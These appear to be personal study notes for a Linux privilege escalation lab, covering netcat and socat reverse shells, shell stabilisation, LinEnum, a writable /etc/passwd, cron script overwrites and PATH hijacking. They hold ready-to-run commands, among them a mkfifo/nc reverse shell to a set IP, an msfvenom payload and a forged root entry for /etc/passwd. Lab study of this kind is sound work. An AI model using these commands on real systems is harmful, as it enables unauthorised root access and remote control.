
- Netcat Listeners are used to obtain `reverse shells` on the attacker's PC and also `bind shells` on the target PC
	Reverse shells - `sudo nc -lvnp [port]`
	 Bind shells - `nc [target IP] [port]`

###### _Netcat Shell Stabilisation_

- these shells are very unstable by default, are non-interactive and can be killed by doing ctrl+C, this is because they are running as a process in the terminal and not a bonafide terminal in their own rights

Technique 1 - **Python** 
- after `sudo nc -lvnp port` and connection establishment but no shell, first thing is to do `python -c 'import pty;pty.spawn("/bin/bash")'` (sometimes may have to use python3, python2 accordingly), this will give a prettier shell 
- then do `export TERM=xterm` - this gives us access to commands like `clear` 
- now background the shell with `ctrl+Z` and then in our own normal terminal run `stty raw echo;fg` 

Technique 2 - **rlwrap**
- do `sudo apt install rlwrap` and while invoking we must do `rlwrap nc -lvnp [port]` - this gives us access to history, tab autocompletion, arrow keys etc

Technique 3 - **socat** (usually for linux)
- For this first we need to transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) to the target machine, this can be done by using a webserver on the attacking machine in the same directory containing the socat binary.
- do `sudo python3 -m http.server 80`, then on a new terminal do `wget <LOCAL-IP>/socat -O /tmp/socat` 
- command to setup a socat listener usual syntax
> `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane` - in linux shells
- but normally while setting up socat listener do the following :
> `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` - one one terminal while another terminal is listening with
> `socat TCP-L:<port> -` ---> now run commands on this terminal & we get output
---

### _Privilege Escalation_

- we use `LinEnum.sh` which is a common bash script which is used to perform common commands related to privilege escalation, we can get a copy of this script from doing `git clone https://github.com/rebootuser/LinEnum.git`
- we can get `LinEnum` on to target machine by starting up a python server and doing wget from target machine
> `python3 -m http.server 80`
> `wget http://[attacking_IP]/LinEnum.sh` - run this on target machine 
- To answer the questions, first do ssh login with credentials `user3:password` and then do `cat /etc/passwd | grep user`, this gives us 8 existing users
- now to find number of shells on the system do `cat /etc/shells` and to see which script executes every 5 mins do `cat /etc/crontab`
- To find SUID/GUID binaries, we can either look for it manually or by running the LinEnum.sh script
> `find / -perm -u=s -type f 2>/dev/null` - to find those files manually

#### _Exploiting Writable /etc/passwd_

- after LinEnum scan we can see that user7 is a member of the root group with gid=0, so we do horizontal privesc and then vertical privesc from user7
- so do `su user7` and password=`password` and we have user7 access and can write `/etc/passwd` file 
- before we add our new user, we create a compliant password hash to add, so we do this by doing
> `openssl passwd -1 -salt new 123` - new for salt and 123 for password (as mentioned in task)
- overwrite /etc/passwd with a new entry with user `new` 
> add the following line :
> `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash` 
> `su new` and when prompted for password enter `123` 
- everytime we get a new user account access, do `sudo -l` to see what commands can be run as root and what cannot
- really useful resource to exploit misconfigured binaries - https://gtfobins.github.io/
---
###### _Additional Notes_
- crontab format
> `#  m   h dom mon dow user  command`
   `17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly` 

- if any user has a root access and can edit the crontab script which is automated to execute in a custom manner, we can overwrite the contents of the script with a reverse shell payload and get root access
> `msfvenom -p cmd/unix/reverse_netcat lhost=10.17.94.67 lport=1234`
> `mkfifo /tmp/qvqf; nc 10.17.94.67 1234 0</tmp/qvqf | /bin/sh >/tmp/qvqf 2>&1; rm /tmp/qvqf`
> now do `echo "[payload generated]" > script.sh`
> and now open a netcat listener on normal terminal `nc -lvnp 1234` and after custom time of cronjob we get the reverse shell with root access.

- Exploiting the PATH variable - go to `/home/user5` and run the `script` and by doing so it just lists out the directories so now we change the PATH variable and add this
> `cd /tmp && echo "/bin/bash" > ls` 
> now do `export PATH=/tmp:$PATH`
> now on doing $PATH we see /tmp in the first and whenever we do `ls` it tries to run the bash executable, so now go back to /home/user5 and do `./script` and we get root shell access
---

###### _Resources for learning more on Privilege Escalation_

https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md

[from PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) 

https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html

https://payatu.com/guide-linux-privilege-escalation